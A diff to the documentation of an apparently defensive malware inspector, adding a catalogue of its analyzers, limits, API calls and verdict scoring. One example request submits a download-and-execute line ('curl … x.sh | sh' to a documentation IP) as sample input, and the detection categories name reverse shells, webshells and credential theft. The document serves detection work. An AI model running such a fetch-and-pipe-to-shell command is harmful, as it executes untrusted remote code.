@@ -13,7 +13,65 @@ Five analyzers registered with `RegisterAnalyzer` in the artifact inspector. The
 | `file-onenote` | file | `inspect_file_onenote.go` | `onenote-embedded-executable`, `onenote-embedded-script`, `onenote-embedded-shortcut`, `onenote-embedded-container`, `onenote-launcher-name`, `onenote-lure-text`, `onenote-many-embeds`, `onenote-no-embeds` |
 | `pkg-manifest` | file, lockfile, script | `inspect_pkg_manifest.go` | `ext-*`, `npm-*`, `pypi-cmdclass-hook`, `pkg-*` |
 
+## Complete analyzer catalogue
+
+Every analyzer registered with `RegisterAnalyzer` (or `registerFileAnalyzer`, the file-kind wrapper that skips empty input and adds a `recover()`), verified against the source. The registry is exposed by `InspectAnalyzerNames()`. A submission runs every analyzer registered for its kind, each under a 5 s budget (`InspectAnalyzerTime`); a timeout or panic becomes an analyzer error in the report and results already added are kept. Report-wide caps: 200 findings, 500 IOCs, 16 layers, 512-char strings, input 32 MiB (text kinds 4 MiB), recursion depth 8.
+
+| Analyzer | Kind(s) | Code | What it checks | Notable limits |
+|---|---|---|---|---|
+| `file-binary` | file | `inspect_file_pe.go`, `_elf.go`, `_macho.go` | Format sniff then PE/DOS-MZ (sections, RWX, entropy, packer sections, UPX, entry point placement, import API groups, timestamps, overlay, Authenticode presence), ELF (RWX segments, odd interpreter, stripped, UPX, LD_PRELOAD, ptrace, `/proc/mem`, fileless exec) and Mach-O (unsigned, risky entitlements, `DYLD_INSERT`, injection APIs). Ids `file-pe-*`, `file-elf-*`, `file-macho-*`. | 8 MiB hashed per section, 96 sections, 5,000 imports |
+| `file-archive` | file | `inspect_file_archive.go` | ZIP and gzip trees: path traversal, executables, scripts, disk images, shortcuts, double and disguised extensions, encrypted entries, decompression bombs, deep nesting. Ids `file-arch-*`. | 20,000 entries listed, 64 MiB total decompressed per tree, 16 MiB per nested read, unzip ratio flag at 200 |
+| `file-document` | file | `inspect_file_document.go` | OOXML (macros, ActiveX, embedded objects, external relationships, template injection, UNC targets, DDE), PDF (auto-run JavaScript/Launch, name obfuscation, encryption) and OLE2 (macro, DDE, embedded, encrypted). Ids `file-ooxml-*`, `file-pdf-*`, `file-ole-*`. | 2 MiB per OOXML entry, 24 MiB total, 60 XML parts |
+| `file-strings` | file | `inspect_file_strings.go` | ASCII and UTF-16LE string runs (min length 6): network IOCs, crypto-wallet strings, ransom-note wording. Ids `file-str-*`. | 24 MiB scanned, 60,000 strings, 4 MiB total |
+| `file-lnk`, `file-diskimage`, `file-vba`, `file-dotnet`, `file-onenote` | file | see sections below | shortcuts, ISO images, VBA macros, .NET metadata, OneNote embeds | per section below |
+| `similarity` | file | `inspect_sim_analyzer.go` | Computes import/symbol/entropy-vector hashes, CTPH and LSH digests (Meta `similarity.digests`) and compares with earlier stored submissions: `sim-near-duplicate`, `sim-imphash-match`, `sim-symhash-match` (weights 4, or 12 when the earlier report scored 40 or more). See [research-similarity.md](research-similarity.md). | digests a leading 8 MiB window (`similarity:digest-window`) |
+| `byte-patterns` | file, script | `inspect_bytes_loader.go`, `bytecontent/*.json` | Embedded, validated JSON rule packs (c2, credentials, loaders, lolbin, macro, miners, packers, persistence, powershell, ransom, reverseshells, webshells). Packs are strict-decoded and every rule must pass its own positive/negative samples and a benign-fixture check at load. | 60 findings per inspection, pack file 8 MiB |
+| `deobfuscation` | script, cmdline | `inspect_deob_analyzer.go`, `_decode.go` | Layered decoder chain (hex escape, base64, XOR on small blobs, decompression and others), IOC extraction (URL, IP, host, exe names) and download-cradle findings `deob-cradle-*` (downloadstring, webrequest, curl-sh, certutil, bitsadmin, iex-remote). Obfuscation-only weight is budgeted to 35 so it cannot alone reach the verdict threshold of 40. | text 2 MiB, blob 1 MiB, XOR blob 64 KiB, 200 matches per decoder per pass, 8 rule findings |
+| `obfuscation-stats` | script, cmdline | `inspect_obf_analyzer.go` | Standardised logistic model over text features (`obf-*` findings); see [research-obfuscation.md](research-obfuscation.md). Inputs under 24 characters are skipped (Meta `skipped`: "too short for statistics"). | obf weight budget 25, model version "1" |
+| `script-static` | script | `inspect_script_static.go` | See "Script static analysis". | per section |
+| `config-assess` | config | `inspect_config_analyzer.go` | Embedded policy assessment of recognised config formats (compliance percentage over pass/fail); emits info `cfg-unrecognized-format` when no format matches. Not scored. | |
+| `config-extra` | config | `inspect_config_extra.go` | CI YAML, Kubernetes, Dockerfile checks. Not scored. | 2 MiB |
+| `lockfile` | lockfile | `inspect_lockfile_analyzer.go` | See [lockfile-inspection.md](lockfile-inspection.md). | |
+| `pkg-manifest` | file, lockfile, script | `inspect_pkg_manifest.go` | Extension manifests, npm install hooks, PyPI `setup.py`. | per section |
+| `domain` | domain | `inspect_domain.go` | See [domain-inspector.md](domain-inspector.md). | |
+| `url` | url | `inspect_url_analyzer.go` | See [url-email-inspection.md](url-email-inspection.md). | |
+| `email`, `email-extra` | email | `inspect_email_analyzer.go`, `inspect_email_extra.go` | See [url-email-inspection.md](url-email-inspection.md) and the email section below. | |
+
+Per kind (from the registrations above): file 12, script 5 (`byte-patterns`, `deobfuscation`, `obfuscation-stats`, `script-static`, `pkg-manifest`), cmdline 2 (`deobfuscation`, `obfuscation-stats`), config 3, lockfile 2 (`lockfile`, `pkg-manifest`), domain 1, url 1, email 2. Use `InspectAnalyzerNames()` for the live list.
+
+Verdict note: findings carry a weight and the score is a capped sum of the strongest ten; `config` reports are `not_scored`. A finding absent from a report means "not matched by this analyzer", never "verified clean".
+
 Later additions on the same contract: .NET triage, OneNote carving, extension and package install-script analysis (sections below), plus two read-only reporting endpoints, `GET /v1/inspect/clusters` and `GET /v1/inspect/sarif` (sections at the end). The `obf-dotnet-*` findings share the existing obfuscation budget (`InspectObfuscationCap`), so obfuscation alone never produces a verdict; no scoring constant changed.
+
+## Calling the inspector, and how the verdict is built
+
+All routes need `Authorization: Bearer <token>` (or a console session). `file` takes raw bytes (max 32 MiB) with an optional `?name=`; the text kinds (`script`, `cmdline`, `domain`, `config`, `lockfile`, `url`, `email`) take raw text or JSON `{"text": "...", "name": "..."}` (max 4 MiB). Empty input is 400, oversize 413.
+
+```sh
+curl -s -X POST "http://127.0.0.1:8099/v1/inspect/script" \
+  -H "Authorization: Bearer $KAVACH_TOKEN" -H 'Content-Type: application/json' \
+  -d '{"text":"curl -s http://198.51.100.7/x.sh | sh","name":"install.sh"}'
+curl -s -X POST "http://127.0.0.1:8099/v1/inspect/file?name=invoice.zip" \
+  -H "Authorization: Bearer $KAVACH_TOKEN" --data-binary @invoice.zip
+curl -s "http://127.0.0.1:8099/v1/inspect/analyzers" -H "Authorization: Bearer $KAVACH_TOKEN"
+curl -s "http://127.0.0.1:8099/v1/inspect/reports?limit=10" -H "Authorization: Bearer $KAVACH_TOKEN"
+```
+
+Response shape (`InspectReport`; values illustrative, fields abridged):
+
+```json
+{"id":"insp-...","time":"...","kind":"script","name":"install.sh","sha256":"...","size":42,
+ "findings":[{"id":"deob-cradle-curl-sh","title":"...","severity":"high","technique":"T1105","evidence":"...","weight":15,"analyzer":"deobfuscation"}],
+ "iocs":[{"type":"url","value":"http://198.51.100.7/x.sh"}],
+ "layers":[], "meta":{}, "score":43, "level":"suspicious",
+ "factors":["... (+28)","... (+15)"],
+ "analyzers":["byte-patterns","deobfuscation","obfuscation-stats","pkg-manifest","script-static"],
+ "limits_hit":[], "errors":[], "mode":"observe-only", "note":"..."}
+```
+
+`GET /v1/inspect/analyzers` returns `{"analyzers": {kind: [names]}, "max_bytes": 33554432, "mode": "observe-only"}`; `GET /v1/inspect/reports` returns `{count, reports, mode}` with the newest stored reports (no input bytes).
+
+Verdict: the score is the sum of the weights of the ten heaviest findings (weight-0 findings never count), plus 40 when an extracted IOC matches the IOC store, capped at 100. Obfuscation-only findings share one budget of 35 (`InspectObfuscationCap`). Levels: `clean` below 15, `low` 15-39, `suspicious` 40-69, `malicious-likely` 70 and above. Kind `config` is never scored: score 0, level `not_scored`. There is no hidden model; each counted finding is listed in `factors`. Reports go to a capped in-memory ring and are lost on restart.
 
 ## Windows shortcuts (.lnk)
 
